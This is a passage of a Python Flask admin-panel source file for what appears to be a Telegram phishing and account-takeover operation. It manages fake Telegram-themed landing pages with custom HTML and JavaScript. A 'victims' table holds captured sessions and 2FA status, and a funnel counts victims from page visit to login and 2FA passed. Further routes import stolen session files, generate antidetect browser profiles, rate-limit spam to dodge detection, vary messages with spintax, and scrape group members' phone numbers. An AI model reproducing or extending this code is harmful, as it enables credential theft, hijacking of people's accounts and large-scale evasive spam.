    prefs = getattr(current_user, 'notification_prefs', None) or {}
    from models.account import Account as AccountModel
    accounts = db.session.query(AccountModel).order_by(AccountModel.phone).all()
    tg_bot_token = current_user.tg_bot_token or ''
    tg_chat_id   = current_user.tg_chat_id or ''
    return render_template('admin/notification_settings.html', prefs=prefs, accounts=accounts,
                           tg_bot_token=tg_bot_token, tg_chat_id=tg_chat_id)


@admin_bp.route('/api/notifications/test_telegram', methods=['POST'])
@login_required
@admin_required
def api_notifications_test_telegram():
    """Send a test notification via Telegram bot."""
    data = request.get_json() or {}
    bot_token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    if not bot_token or not chat_id:
        return jsonify({'success': False, 'error': 'bot_token and chat_id required'}), 400
    import requests as _req
    try:
        resp = _req.post(
            f'https://api.telegram.org/bot{bot_token}/sendMessage',
            json={'chat_id': chat_id, 'text': '✅ <b>Ameba</b>: тестовое уведомление работает!', 'parse_mode': 'HTML'},
            timeout=10,
        )
        if resp.status_code == 200:
            log_action('test_telegram_notification', f'chat_id={chat_id}')
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': f'Telegram API error {resp.status_code}: {resp.text}'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# EVENT LISTENER MANAGEMENT
# ==========================================
@admin_bp.route('/api/listener/status')
@login_required
def api_listener_status():
    try:
        from services.telegram.event_listener import get_listener_status
        status = get_listener_status()
        return jsonify({'success': True, **status})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e), 'connected': 0, 'total_active': 0, 'running': False})


@admin_bp.route('/api/listener/start', methods=['POST'])
@login_required
@admin_required
def api_listener_start():
    try:
        from tasks.event_listener_task import run_event_listener
        t = run_event_listener.delay()
        log_action('listener_start', f'task_id={t.id}')
        return jsonify({'success': True, 'task_id': t.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/api/listener/stop', methods=['POST'])
@login_required
@admin_required
def api_listener_stop():
    try:
        import asyncio
        from services.telegram.event_listener import stop_listener
        asyncio.run(stop_listener())
        log_action('listener_stop', '')
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@admin_bp.route('/api/listener/restart', methods=['POST'])
@login_required
@admin_required
def api_listener_restart():
    try:
        import asyncio
        from services.telegram.event_listener import stop_listener
        from tasks.event_listener_task import run_event_listener
        asyncio.run(stop_listener())
        t = run_event_listener.delay()
        log_action('listener_restart', f'task_id={t.id}')
        return jsonify({'success': True, 'task_id': t.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==========================================
# HEALTH CHECK
# ==========================================
@admin_bp.route('/api/health')
@login_required
def api_health():
    """Health check endpoint: checks DB connectivity and table existence."""
    try:
        from sqlalchemy import text, inspect as sa_inspect
        db.session.execute(text('SELECT 1'))
        _allowed_tables = frozenset(['accounts', 'proxies', 'campaigns', 'landing_pages', 'victims', 'tracked_links', 'automations'])
        tables = []
        inspector = sa_inspect(db.engine)
        existing_tables = set(inspector.get_table_names())
        for table_name in sorted(_allowed_tables):
            tables.append({'table': table_name, 'exists': table_name in existing_tables})
        return jsonify({'success': True, 'status': 'ok', 'tables': tables})
    except Exception as e:
        return jsonify({'success': False, 'status': 'error', 'error': str(e)}), 500


# ==========================================
# PROXY BULK CHECK
# ==========================================
@admin_bp.route('/proxies/bulk_check', methods=['POST'])
@login_required
@admin_required
def proxies_bulk_check():
    """Start mass proxy check via Celery."""
    try:
        from tasks.proxy_checker import check_all_proxies
        task = check_all_proxies.delay()
        log_action('bulk_check_proxies', 'Started mass proxy check')
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==========================================
# LANDING PAGES
# ==========================================
@admin_bp.route('/landings')
@login_required
def landings():
    """List all landing pages."""
    from models.landing_page import LandingPage
    items = db.session.query(LandingPage).order_by(desc(LandingPage.created_at)).all()
    return render_template('admin/landings.html', landings=items)


@admin_bp.route('/api/landings')
@login_required
def api_landings_list():
    from models.landing_page import LandingPage
    items = db.session.query(LandingPage).order_by(desc(LandingPage.created_at)).all()
    return jsonify({'success': True, 'landings': [{
        'id': l.id, 'slug': l.slug, 'name': l.name,
        'language': l.language, 'theme': l.theme, 'is_active': l.is_active,
        'visits': l.visits, 'conversions': l.conversions,
        'created_at': l.created_at.isoformat() if l.created_at else None,
    } for l in items]})


@admin_bp.route('/api/landings', methods=['POST'])
@login_required
@admin_required
def api_landings_create():
    from models.landing_page import LandingPage
    data = request.get_json()
    slug = data.get('slug', '').strip().lower().replace(' ', '-')
    if not slug or not data.get('name'):
        return jsonify({'success': False, 'error': 'slug and name are required'})
    existing = db.session.query(LandingPage).filter(LandingPage.slug == slug).first()
    if existing:
        return jsonify({'success': False, 'error': 'Slug already exists'})
    landing = LandingPage(
        slug=slug,
        name=data['name'],
        html_content=data.get('html_content', ''),
        css_content=data.get('css_content'),
        js_content=data.get('js_content'),
        language=data.get('language', 'uk'),
        theme=data.get('theme', 'telegram'),
        is_active=data.get('is_active', True),
        created_by=current_user.id,
    )
    db.session.add(landing)
    db.session.commit()
    log_action('create_landing', f'slug={slug}')
    return jsonify({'success': True, 'id': landing.id})


@admin_bp.route('/api/landings/<int:landing_id>', methods=['PUT'])
@login_required
@admin_required
def api_landings_update(landing_id):
    from models.landing_page import LandingPage
    landing = db.session.get(LandingPage, landing_id)
    if not landing:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json()
    for field in ('name', 'html_content', 'css_content', 'js_content', 'language', 'theme', 'is_active'):
        if field in data:
            setattr(landing, field, data[field])
    if 'slug' in data:
        new_slug = data['slug'].strip().lower().replace(' ', '-')
        existing = db.session.query(LandingPage).filter(
            LandingPage.slug == new_slug, LandingPage.id != landing_id
        ).first()
        if existing:
            return jsonify({'success': False, 'error': 'Slug already exists'})
        landing.slug = new_slug
    db.session.commit()
    log_action('update_landing', f'id={landing_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/landings/<int:landing_id>', methods=['DELETE'])
@login_required
@admin_required
def api_landings_delete(landing_id):
    from models.landing_page import LandingPage
    landing = db.session.get(LandingPage, landing_id)
    if not landing:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(landing)
    db.session.commit()
    log_action('delete_landing', f'id={landing_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/landings/<int:landing_id>/preview')
@login_required
def api_landings_preview(landing_id):
    from models.landing_page import LandingPage
    landing = db.session.get(LandingPage, landing_id)
    if not landing:
        return 'Not found', 404
    html = landing.html_content or ''
    if landing.css_content:
        html = f'<style>{landing.css_content}</style>\n' + html
    if landing.js_content:
        html = html + f'\n<script>{landing.js_content}</script>'
    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}


@admin_bp.route('/api/landings/templates/<theme>')
@login_required
def api_landing_template(theme):
    """Return a pre-built landing page template by theme key."""
    from services.landing_templates import LANDING_TEMPLATES
    tpl = LANDING_TEMPLATES.get(theme)
    if not tpl:
        return jsonify({'success': False, 'error': 'Template not found'}), 404
    return jsonify({'success': True, 'template': {
        'name': tpl['name'],
        'slug': tpl['slug'],
        'language': tpl['language'],
        'theme': tpl['theme'],
        'html_content': tpl['html_content'],
    }})


# ==========================================
# VICTIMS
# ==========================================
@admin_bp.route('/victims')
@login_required
def victims():
    """List all victims."""
    from models.victim import Victim
    page = request.args.get('page', 1, type=int)
    stmt = db.session.query(Victim).order_by(desc(Victim.first_visit_at))
    total = stmt.count()
    items = stmt.offset((page - 1) * 50).limit(50).all()
    return render_template('admin/victims.html', victims=items, total=total, page=page)


@admin_bp.route('/api/victims')
@login_required
def api_victims():
    from models.victim import Victim
    status_filter = request.args.get('status', '')
    q = db.session.query(Victim).order_by(desc(Victim.first_visit_at))
    if status_filter:
        q = q.filter(Victim.status == status_filter)
    items = q.limit(200).all()
    return jsonify({'success': True, 'victims': [{
        'id': v.id, 'phone': v.phone, 'ip': v.ip, 'country': v.country,
        'device': v.device, 'os': v.os, 'browser': v.browser,
        'status': v.status, 'session_captured': v.session_captured,
        'twofa_captured': v.twofa_captured,
        'first_visit_at': v.first_visit_at.isoformat() if v.first_visit_at else None,
        'login_at': v.login_at.isoformat() if v.login_at else None,
    } for v in items]})


@admin_bp.route('/api/victims/funnel')
@login_required
def api_victims_funnel():
    from models.victim import Victim
    total = db.session.query(func.count(Victim.id)).scalar() or 0
    code_sent = db.session.query(func.count(Victim.id)).filter(
        Victim.status.in_(['code_sent', 'code_entered', 'logged_in', '2fa_passed'])
    ).scalar() or 0
    logged_in = db.session.query(func.count(Victim.id)).filter(
        Victim.status.in_(['logged_in', '2fa_passed'])
    ).scalar() or 0
    twofa_passed = db.session.query(func.count(Victim.id)).filter(
        Victim.status == '2fa_passed'
    ).scalar() or 0
    return jsonify({
        'success': True,
        'funnel': {
            'visited': total,
            'code_sent': code_sent,
            'logged_in': logged_in,
            '2fa_passed': twofa_passed,
        }
    })


# ==========================================
# TRACKED LINKS
# ==========================================
@admin_bp.route('/links')
@login_required
def links():
    """Manage tracked links."""
    from models.tracked_link import TrackedLink
    items = db.session.query(TrackedLink).order_by(desc(TrackedLink.created_at)).all()
    return render_template('admin/links.html', links=items)


@admin_bp.route('/api/links')
@login_required
def api_links_list():
    from models.tracked_link import TrackedLink
    items = db.session.query(TrackedLink).order_by(desc(TrackedLink.created_at)).all()
    return jsonify({'success': True, 'links': [{
        'id': l.id, 'short_code': l.short_code, 'destination_url': l.destination_url,
        'clicks': l.clicks, 'unique_clicks': l.unique_clicks,
        'is_active': l.is_active,
        'expires_at': l.expires_at.isoformat() if l.expires_at else None,
        'created_at': l.created_at.isoformat() if l.created_at else None,
    } for l in items]})


@admin_bp.route('/api/links', methods=['POST'])
@login_required
@admin_required
def api_links_create():
    from models.tracked_link import TrackedLink
    data = request.get_json()
    short_code = data.get('short_code', '').strip()
    if not short_code:
        import random
        import string
        short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    destination_url = data.get('destination_url', '').strip()
    if not destination_url:
        return jsonify({'success': False, 'error': 'destination_url is required'})
    existing = db.session.query(TrackedLink).filter(TrackedLink.short_code == short_code).first()
    if existing:
        return jsonify({'success': False, 'error': 'Short code already exists'})
    expires_at = None
    if data.get('expires_at'):
        try:
            expires_at = datetime.datetime.fromisoformat(data['expires_at'])
        except Exception:
            pass
    link = TrackedLink(
        short_code=short_code,
        destination_url=destination_url,
        campaign_id=data.get('campaign_id'),
        is_active=data.get('is_active', True),
        created_by=current_user.id,
        expires_at=expires_at,
    )
    db.session.add(link)
    db.session.commit()
    log_action('create_link', f'short_code={short_code}')
    return jsonify({'success': True, 'id': link.id, 'short_code': short_code})


@admin_bp.route('/api/links/<int:link_id>', methods=['DELETE'])
@login_required
@admin_required
def api_links_delete(link_id):
    from models.tracked_link import TrackedLink
    link = db.session.get(TrackedLink, link_id)
    if not link:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(link)
    db.session.commit()
    log_action('delete_link', f'id={link_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/links/<int:link_id>/stats')
@login_required
def api_links_stats(link_id):
    from models.tracked_link import TrackedLink, LinkClick
    link = db.session.get(TrackedLink, link_id)
    if not link:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    clicks = db.session.query(LinkClick).filter(LinkClick.link_id == link_id).order_by(
        desc(LinkClick.created_at)
    ).limit(100).all()
    return jsonify({'success': True, 'link': {
        'id': link.id, 'short_code': link.short_code,
        'clicks': link.clicks, 'unique_clicks': link.unique_clicks,
    }, 'recent_clicks': [{
        'ip': c.ip, 'country': c.country, 'device_type': c.device_type,
        'os': c.os, 'browser': c.browser, 'referer': c.referer,
        'created_at': c.created_at.isoformat() if c.created_at else None,
    } for c in clicks]})


# ==========================================
# AUTOMATIONS
# ==========================================
@admin_bp.route('/automations')
@login_required
def automations():
    """List and manage automations."""
    from models.automation import Automation
    items = db.session.query(Automation).order_by(desc(Automation.created_at)).all()
    return render_template('admin/automations.html', automations=items)


@admin_bp.route('/api/automations')
@login_required
def api_automations_list():
    from models.automation import Automation
    items = db.session.query(Automation).order_by(desc(Automation.created_at)).all()
    return jsonify({'success': True, 'automations': [{
        'id': a.id, 'name': a.name, 'trigger_type': a.trigger_type,
        'is_active': a.is_active, 'runs_count': a.runs_count,
        'last_run': a.last_run.isoformat() if a.last_run else None,
        'steps': a.steps,
        'created_at': a.created_at.isoformat() if a.created_at else None,
    } for a in items]})


@admin_bp.route('/api/automations', methods=['POST'])
@login_required
@admin_required
def api_automations_create():
    from models.automation import Automation
    data = request.get_json()
    if not data.get('name') or not data.get('trigger_type'):
        return jsonify({'success': False, 'error': 'name and trigger_type are required'})
    auto = Automation(
        name=data['name'],
        trigger_type=data['trigger_type'],
        trigger_config=data.get('trigger_config'),
        steps=data.get('steps', []),
        is_active=data.get('is_active', True),
        created_by=current_user.id,
    )
    db.session.add(auto)
    db.session.commit()
    log_action('create_automation', f'name={auto.name}')
    return jsonify({'success': True, 'id': auto.id})


@admin_bp.route('/api/automations/<int:auto_id>', methods=['PUT'])
@login_required
@admin_required
def api_automations_update(auto_id):
    from models.automation import Automation
    auto = db.session.get(Automation, auto_id)
    if not auto:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json()
    for field in ('name', 'trigger_type', 'trigger_config', 'steps', 'is_active'):
        if field in data:
            setattr(auto, field, data[field])
    db.session.commit()
    log_action('update_automation', f'id={auto_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/automations/<int:auto_id>', methods=['DELETE'])
@login_required
@admin_required
def api_automations_delete(auto_id):
    from models.automation import Automation
    auto = db.session.get(Automation, auto_id)
    if not auto:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(auto)
    db.session.commit()
    log_action('delete_automation', f'id={auto_id}')
    return jsonify({'success': True})


# ==========================================
# LIVE ANALYTICS
# ==========================================
@admin_bp.route('/api/live/stream')
@login_required
def api_live_stream():
    """Polling endpoint for live analytics events. Returns JSON and closes immediately."""
    import json as json_mod
    events = []
    try:
        import redis
        r = redis.from_url(Config.CELERY_BROKER_URL or 'redis://localhost:6379/0')
        raw = r.lrange('live_events_log', 0, 19)
        for item in raw:
            try:
                events.append(json_mod.loads(item.decode('utf-8')))
            except Exception:
                pass
    except Exception as e:
        log.warning(f'api_live_stream Redis error: {e}')
    return jsonify({'success': True, 'events': events})


@admin_bp.route('/api/live/stats')
@login_required
def api_live_stats():
    """Get current live visitor stats from Redis."""
    try:
        from core.config import Config
        import redis
        r = redis.from_url(Config.CELERY_BROKER_URL or 'redis://localhost:6379/0')
        keys = r.scan_iter('live:visitor:*')
        active_visitors = sum(1 for _ in keys)
        return jsonify({'success': True, 'active_visitors': active_visitors})
    except Exception as e:
        return jsonify({'success': True, 'active_visitors': 0, 'error': str(e)})


# ==========================================
# UPDATE import_sessions TO DETECT FORMAT
# ==========================================
@admin_bp.route('/accounts/import_sessions_v2', methods=['POST'])
@login_required
@admin_required
def import_sessions_v2():
    """Import sessions with auto-detection of StringSession vs SQLite format."""
    files = request.files.getlist('sessions')
    imported = 0
    errors = []
    for f in files:
        try:
            raw = f.read()
            from utils.session_converter import detect_session_format, sqlite_session_to_string
            fmt = detect_session_format(raw)
            if fmt == 'sqlite':
                import tempfile
                with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as tmp:
                    tmp.write(raw)
                    tmp_path = tmp.name
                try:
                    session_str = sqlite_session_to_string(tmp_path)
                finally:
                    try:
                        os.unlink(tmp_path)
                    except Exception:
                        pass
            else:
                session_str = raw.decode('utf-8').strip()
            if not session_str:
                errors.append(f'{f.filename}: empty session')
                continue
            from utils.encryption import encrypt_session_data
            acc = Account(
                id=uuid.uuid4().hex,
                phone=f'imported_{uuid.uuid4().hex[:8]}',
                session_data=encrypt_session_data(session_str),
                session_file=f.filename,
                status='active'
            )
            db.session.add(acc)
            db.session.commit()
            try:
                from tasks.session_checker import check_single_session_task
                check_single_session_task.delay(acc.id)
            except Exception:
                pass
            imported += 1
        except Exception as e:
            errors.append(f'{f.filename}: {e}')
    log_action('import_sessions_v2', f'imported={imported}')
    return jsonify({'success': True, 'imported': imported, 'errors': errors})


# ==========================================
# ANTIDETECT PROFILES
# ==========================================
@admin_bp.route('/antidetect')
@login_required
def antidetect():
    from models.antidetect_profile import AntidetectProfile
    from models.account import Account
    profiles = db.session.query(AntidetectProfile).order_by(AntidetectProfile.created_at.desc()).all()
    accounts = db.session.query(Account).filter_by(status='active').order_by(Account.phone).all()
    return render_template('admin/antidetect.html', profiles=profiles, accounts=accounts)


@admin_bp.route('/api/antidetect/generate', methods=['POST'])
@login_required
def api_antidetect_generate():
    from services.antidetect.profile_manager import bulk_generate_profiles
    data = request.get_json() or {}
    count = min(int(data.get('count', 1)), 100)
    generated = bulk_generate_profiles(count, is_template=data.get('is_template', False))
    log_action('antidetect_generate', f'Generated {generated} profiles')
    return jsonify({'success': True, 'generated': generated})


@admin_bp.route('/api/antidetect/assign', methods=['POST'])
@login_required
def api_antidetect_assign():
    from services.antidetect.profile_manager import assign_profile_to_account
    data = request.get_json() or {}
    account_id = data.get('account_id')
    profile_id = data.get('profile_id')
    if not account_id:
        return jsonify({'success': False, 'error': 'account_id required'})
    result = assign_profile_to_account(account_id, profile_id)
    if result is None:
        return jsonify({'success': False, 'error': 'Profile not found'})
    log_action('antidetect_assign', f'Assigned profile {result} to account {account_id}')
    return jsonify({'success': True, 'profile_id': result})


@admin_bp.route('/api/antidetect/auto_assign', methods=['POST'])
@login_required
def api_antidetect_auto_assign():
    from services.antidetect.profile_manager import auto_assign_profiles
    assigned = auto_assign_profiles()
    log_action('antidetect_auto_assign', f'Auto-assigned {assigned} profiles')
    return jsonify({'success': True, 'assigned': assigned})


@admin_bp.route('/api/antidetect/<int:profile_id>', methods=['DELETE'])
@login_required
def api_antidetect_delete(profile_id):
    from models.antidetect_profile import AntidetectProfile
    profile = db.session.get(AntidetectProfile, profile_id)
    if not profile:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(profile)
    db.session.commit()
    log_action('antidetect_delete', f'Deleted profile {profile_id}')
    return jsonify({'success': True})


# ==========================================
# COOLDOWN MANAGER
# ==========================================
@admin_bp.route('/cooldowns')
@login_required
def cooldowns():
    from models.cooldown import CooldownRule, CooldownLog
    rules = db.session.query(CooldownRule).order_by(CooldownRule.created_at.desc()).all()
    recent_logs = db.session.query(CooldownLog).order_by(CooldownLog.performed_at.desc()).limit(50).all()
    return render_template('admin/cooldowns.html', rules=rules, recent_logs=recent_logs)


@admin_bp.route('/api/cooldowns', methods=['POST'])
@login_required
def api_cooldown_create():
    from models.cooldown import CooldownRule
    data = request.get_json() or {}
    rule = CooldownRule(
        name=data.get('name', 'New Rule'),
        action_type=data.get('action_type', 'send_message'),
        min_delay=int(data.get('min_delay', 30)),
        max_delay=int(data.get('max_delay', 120)),
        max_per_hour=int(data.get('max_per_hour', 20)),
        max_per_day=int(data.get('max_per_day', 100)),
        burst_limit=int(data.get('burst_limit', 5)),
        burst_cooldown=int(data.get('burst_cooldown', 300)),
    )
    db.session.add(rule)
    db.session.commit()
    log_action('cooldown_create', f'Created rule {rule.name}')
    return jsonify({'success': True, 'id': rule.id})


@admin_bp.route('/api/cooldowns/<int:rule_id>', methods=['PUT'])
@login_required
def api_cooldown_update(rule_id):
    from models.cooldown import CooldownRule
    rule = db.session.get(CooldownRule, rule_id)
    if not rule:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    for field in ['name', 'action_type', 'min_delay', 'max_delay', 'max_per_hour', 'max_per_day', 'burst_limit', 'burst_cooldown', 'is_active']:
        if field in data:
            setattr(rule, field, data[field])
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/cooldowns/<int:rule_id>', methods=['DELETE'])
@login_required
def api_cooldown_delete(rule_id):
    from models.cooldown import CooldownRule
    rule = db.session.get(CooldownRule, rule_id)
    if not rule:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(rule)
    db.session.commit()
    log_action('cooldown_delete', f'Deleted rule {rule_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/cooldowns/reset/<account_id>', methods=['POST'])
@login_required
def api_cooldown_reset(account_id):
    from services.cooldown.manager import reset_account_limits
    ok = reset_account_limits(account_id)
    return jsonify({'success': ok})


# ==========================================
# SPINTAX TEMPLATES
# ==========================================
@admin_bp.route('/spintax')
@login_required
def spintax():
    from models.spintax_template import SpintaxTemplate
    templates = db.session.query(SpintaxTemplate).order_by(SpintaxTemplate.created_at.desc()).all()
    return render_template('admin/spintax.html', templates=templates)


@admin_bp.route('/api/spintax', methods=['POST'])
@login_required
def api_spintax_create():
    from models.spintax_template import SpintaxTemplate
    data = request.get_json() or {}
    tmpl = SpintaxTemplate(
        name=data.get('name', 'New Template'),
        content=data.get('content', ''),
        category=data.get('category', 'general'),
        language=data.get('language', 'uk'),
        created_by=current_user.id,
    )
    db.session.add(tmpl)
    db.session.commit()
    log_action('spintax_create', f'Created template {tmpl.name}')
    return jsonify({'success': True, 'id': tmpl.id})


@admin_bp.route('/api/spintax/<int:tmpl_id>', methods=['PUT'])
@login_required
def api_spintax_update(tmpl_id):
    from models.spintax_template import SpintaxTemplate
    tmpl = db.session.get(SpintaxTemplate, tmpl_id)
    if not tmpl:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    for field in ['name', 'content', 'category', 'language']:
        if field in data:
            setattr(tmpl, field, data[field])
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/spintax/<int:tmpl_id>', methods=['DELETE'])
@login_required
def api_spintax_delete(tmpl_id):
    from models.spintax_template import SpintaxTemplate
    tmpl = db.session.get(SpintaxTemplate, tmpl_id)
    if not tmpl:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(tmpl)
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/spintax/preview', methods=['POST'])
@login_required
def api_spintax_preview():
    from services.spintax.engine import generate_previews, calculate_uniqueness
    data = request.get_json() or {}
    text = data.get('text', '')
    count = min(int(data.get('count', 5)), 20)
    previews = generate_previews(text, count)
    uniqueness = calculate_uniqueness(text)
    return jsonify({'success': True, 'previews': previews, 'uniqueness': uniqueness})


# ==========================================
# MEMBER PARSER
# ==========================================
@admin_bp.route('/parser')
@login_required
def parser():
    from models.parse_task import ParseTask
    from models.account import Account
    tasks = db.session.query(ParseTask).order_by(ParseTask.created_at.desc()).all()
    accounts = db.session.query(Account).filter_by(status='active').order_by(Account.phone).all()
    return render_template('admin/parser.html', tasks=tasks, accounts=accounts)


@admin_bp.route('/api/parser', methods=['POST'])
@login_required
def api_parser_create():
    from models.parse_task import ParseTask
    data = request.get_json() or {}
    task = ParseTask(
        name=data.get('name', 'New Parse Task'),
        source_type=data.get('source_type', 'group'),
        source_link=data.get('source_link', ''),
        account_id=data.get('account_id'),
        filters=data.get('filters', {}),
        created_by=current_user.id,
        status='pending',
    )
    db.session.add(task)
    db.session.commit()
    log_action('parser_create', f'Created parse task {task.name}')
    # Launch background task if celery is available
    try:
        from tasks.parser import run_parse_task
        run_parse_task.delay(task.id, task.account_id, task.source_link, task.filters or {})
    except Exception as e:
        log.warning(f"Could not launch celery parse task: {e}")
    return jsonify({'success': True, 'id': task.id})


@admin_bp.route('/api/parser/<int:task_id>', methods=['DELETE'])
@login_required
def api_parser_delete(task_id):
    from models.parse_task import ParseTask
    task = db.session.get(ParseTask, task_id)
    if not task:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(task)
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/parser/<int:task_id>/export_csv')
@login_required
def api_parser_export_csv(task_id):
    import csv
    import io
    from models.parse_task import ParseTask
    task = db.session.get(ParseTask, task_id)
    if not task or not task.result_data:
        return jsonify({'success': False, 'error': 'No data'}), 404
    output = io.BytesIO()
    wrapper = io.TextIOWrapper(output, encoding='utf-8', newline='')
    writer = csv.DictWriter(wrapper, fieldnames=['user_id', 'username', 'first_name', 'last_name', 'phone'])
    writer.writeheader()
    for row in task.result_data:
        writer.writerow({k: row.get(k, '') for k in ['user_id', 'username', 'first_name', 'last_name', 'phone']})
    wrapper.flush()
    output.seek(0)
    return send_file(
        output,
        mimetype='text/csv',
        as_attachment=True,
        download_name=f'parse_task_{task_id}.csv',
    )


# ==========================================
# A/B TESTS
# ==========================================
@admin_bp.route('/ab_tests')
@login_required
def ab_tests():
    from models.ab_test import ABTest
    tests = db.session.query(ABTest).order_by(ABTest.created_at.desc()).all()
    return render_template('admin/ab_tests.html', tests=tests)


@admin_bp.route('/api/ab_tests', methods=['POST'])
@login_required
def api_ab_test_create():
    from models.ab_test import ABTest
    import re
    data = request.get_json() or {}
    slug = data.get('slug', '').strip()
    if not slug:
        return jsonify({'success': False, 'error': 'slug required'})
    if not re.match(r'^[a-z0-9_-]+$', slug):
        return jsonify({'success': False, 'error': 'slug must be lowercase alphanumeric with - or _'})
    test = ABTest(
        name=data.get('name', 'New A/B Test'),
        slug=slug,
        description=data.get('description', ''),
        variants=data.get('variants', []),
        created_by=current_user.id,
    )
    db.session.add(test)
    db.session.commit()
    log_action('ab_test_create', f'Created A/B test {test.name}')
    return jsonify({'success': True, 'id': test.id})


@admin_bp.route('/api/ab_tests/<int:test_id>', methods=['PUT'])
@login_required
def api_ab_test_update(test_id):
    from models.ab_test import ABTest
    test = db.session.get(ABTest, test_id)
    if not test:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    for field in ['name', 'description', 'status', 'variants', 'winner_variant']:
        if field in data:
            setattr(test, field, data[field])
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/ab_tests/<int:test_id>', methods=['DELETE'])
@login_required
def api_ab_test_delete(test_id):
    from models.ab_test import ABTest
    test = db.session.get(ABTest, test_id)
    if not test:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(test)
    db.session.commit()
    return jsonify({'success': True})


# ==========================================
# ACCOUNT HEALTH SCORE API
# ==========================================
@admin_bp.route('/api/accounts/<string:account_id>/health_score')
@login_required
def api_account_health_score(account_id):
    """Returns health score for a specific account."""
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    from services.accounts.health_score import calculate_health_score, get_health_color, get_health_emoji
    score = calculate_health_score(account)
    return jsonify({
        'success': True,
        'account_id': account_id,
        'score': score,
        'color': get_health_color(score),
        'emoji': get_health_emoji(score),
    })


@admin_bp.route('/api/accounts/health_scores')
@login_required
def api_accounts_health_scores():
    """Returns health scores for all accounts."""
    from services.accounts.health_score import calculate_health_score, get_health_color, get_health_emoji
    accounts = db.session.query(Account).all()
    result = []
    for acc in accounts:
        score = calculate_health_score(acc)
        result.append({
            'id': acc.id,
            'phone': acc.phone,
            'score': score,
            'color': get_health_color(score),
            'emoji': get_health_emoji(score),
        })
    return jsonify({'success': True, 'data': result})


# ==========================================
# ACCOUNT POOLS
# ==========================================
@admin_bp.route('/accounts/pools')
@login_required
def account_pools():
    """Account pool management page."""
    from models.account_pool import AccountPool, AccountPoolMember
    pools = db.session.query(AccountPool).order_by(AccountPool.created_at.desc()).all()
    # Add member count to each pool
    pool_data = []
    for p in pools:
        count = db.session.query(AccountPoolMember).filter_by(pool_id=p.id).count()
        pool_data.append({'pool': p, 'member_count': count})
    return render_template('admin/account_pools.html', pool_data=pool_data)


@admin_bp.route('/api/account_pools', methods=['POST'])
@login_required
def api_account_pool_create():
    from models.account_pool import AccountPool
    data = request.get_json() or {}
    pool = AccountPool(
        name=data.get('name', 'New Pool'),
        description=data.get('description', ''),
        selection_strategy=data.get('selection_strategy', 'round_robin'),
        max_actions_per_account=data.get('max_actions_per_account', 50),
        cooldown_minutes=data.get('cooldown_minutes', 60),
        created_by=current_user.id,
    )
    db.session.add(pool)
    db.session.commit()
    log_action('account_pool_create', f'Created pool: {pool.name}')
    return jsonify({'success': True, 'id': pool.id})


@admin_bp.route('/api/account_pools/<int:pool_id>', methods=['PUT'])
@login_required
def api_account_pool_update(pool_id):
    from models.account_pool import AccountPool
    pool = db.session.get(AccountPool, pool_id)
    if not pool:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    for field in ['name', 'description', 'selection_strategy', 'max_actions_per_account', 'cooldown_minutes']:
        if field in data:
            setattr(pool, field, data[field])
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/api/account_pools/<int:pool_id>', methods=['DELETE'])
@login_required
def api_account_pool_delete(pool_id):
    from models.account_pool import AccountPool
    pool = db.session.get(AccountPool, pool_id)
    if not pool:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(pool)
    db.session.commit()
    log_action('account_pool_delete', f'Deleted pool: {pool.name}')
    return jsonify({'success': True})


@admin_bp.route('/api/account_pools/<int:pool_id>/members', methods=['POST'])
@login_required
def api_account_pool_add_member(pool_id):
    from models.account_pool import AccountPool, AccountPoolMember
    pool = db.session.get(AccountPool, pool_id)
    if not pool:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    account_ids = data.get('account_ids', [])
    added = 0
    for aid in account_ids:
        existing = db.session.query(AccountPoolMember).filter_by(pool_id=pool_id, account_id=aid).first()
        if not existing:
            member = AccountPoolMember(pool_id=pool_id, account_id=aid)
            db.session.add(member)
            added += 1
    db.session.commit()
    return jsonify({'success': True, 'added': added})


@admin_bp.route('/api/account_pools/<int:pool_id>/members/<string:account_id>', methods=['DELETE'])
@login_required
def api_account_pool_remove_member(pool_id, account_id):
    from models.account_pool import AccountPoolMember
